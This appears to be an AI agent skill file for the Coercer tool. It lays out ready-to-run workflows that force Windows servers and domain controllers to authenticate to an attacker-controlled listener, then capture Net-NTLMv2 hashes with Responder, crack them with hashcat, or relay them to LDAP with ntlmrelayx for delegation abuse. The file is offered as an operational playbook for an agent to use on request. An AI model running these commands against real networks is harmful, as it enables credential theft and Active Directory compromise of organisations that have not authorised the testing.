---
name: coercer
description: "Coercer forces Windows servers to authenticate to a controlled host by abusing MS-RPRN, MS-EFSR, MS-DFSNM, and other RPC protocols, enabling NTLM relay or hash capture. Use when asked to coerce NTLM authentication from a Windows server, set up an NTLM relay via Responder, or exploit printspooler/PetitPotam-style auth coercion."
license: MIT
compatibility: "Linux. Install: pip install coercer or git clone + pip install -r requirements.txt."
metadata:
  author: AeonDave
  version: "1.0"
---

# Coercer

Force Windows servers to authenticate (NTLM) to your listener — enables relay, capture, and hash extraction.

## Concept

Coercer abuses multiple RPC protocols/methods that trigger a Windows host to initiate an outbound NTLM authentication to an attacker-controlled IP. The captured Net-NTLMv2 hash can be:
- **Cracked offline** (Hashcat/John)
- **Relayed** in real-time (ntlmrelayx) to access other systems

## Quick Start

```bash
# Coerce auth from a server, capture with Responder
# Terminal 1: Start Responder
responder -I eth0 -wv

# Terminal 2: Coerce auth
coercer coerce -l 10.10.14.1 -t 10.10.10.10 -u user -p password -d domain.local
```

## Sub-commands

| Command | Description |
|---------|-------------|
| `coerce` | Trigger authentication coercion |
| `scan` | Scan target for available coercion methods |
| `fuzz` | Fuzz available RPC methods |

## Core Flags

| Flag | Description |
|------|-------------|
| `-l <ip>` | Listener IP (attacker machine) |
| `-t <ip>` | Target IP (Windows server to coerce) |
| `-u <user>` | Username for auth to target |
| `-p <pass>` | Password |
| `-d <domain>` | Domain |
| `-H <hash>` | NTLM hash |
| `--filter-protocol-name <name>` | Only use specific protocol (e.g., `MS-RPRN`) |
| `--filter-method-name <name>` | Specific RPC method |
| `--always-continue` | Continue despite errors |

## Supported Protocols

| Protocol | Common Name |
|----------|-------------|
| `MS-RPRN` | PrinterBug / SpoolSample |
| `MS-EFSR` | PetitPotam |
| `MS-DFSNM` | DFSCoerce |
| `MS-FSRVP` | ShadowCoerce |
| `MS-EVEN6` | EventLog |

## Attack Workflows

### Capture Net-NTLMv2 Hash

```bash
# 1. Start Responder
sudo responder -I eth0 -wv

# 2. Coerce target
coercer coerce -l 10.10.14.1 -t 10.10.10.10 -u user -p pass -d corp.local

# 3. Responder captures hash → crack offline
hashcat -a 0 -m 5600 hash.txt rockyou.txt
```

### NTLM Relay to LDAP (for S4U2Self / RBCD)

```bash
# 1. Start ntlmrelayx targeting DC LDAP
ntlmrelayx.py -t ldap://dc.corp.local --delegate-access -smb2support

# 2. Coerce DC authentication
coercer coerce -l 10.10.14.1 -t dc.corp.local -u user -p pass -d corp.local
```

### Scan Available Methods

```bash
coercer scan -t 10.10.10.10 -u user -p pass -d corp.local
```

## Resources

| File | When to load |
|------|--------------|
| `references/ntlm-relay.md` | Full relay chain setup, ntlmrelayx options, RBCD exploitation |

## Structuring This Skill
